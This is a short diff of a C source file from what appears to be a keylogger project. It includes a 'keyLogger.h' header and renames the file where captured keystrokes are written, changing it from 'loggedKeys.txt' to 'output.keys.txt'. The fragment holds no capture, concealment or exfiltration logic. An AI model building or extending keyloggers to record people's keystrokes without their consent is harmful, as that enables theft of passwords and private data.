@@ -2,7 +2,7 @@
 
 #include "keyLogger.h"
 
-#define OUTPUT_FILE_NAME "loggedKeys.txt"
+#define OUTPUT_FILE_NAME "output.keys.txt"
 
 
 const errno_t main(void)
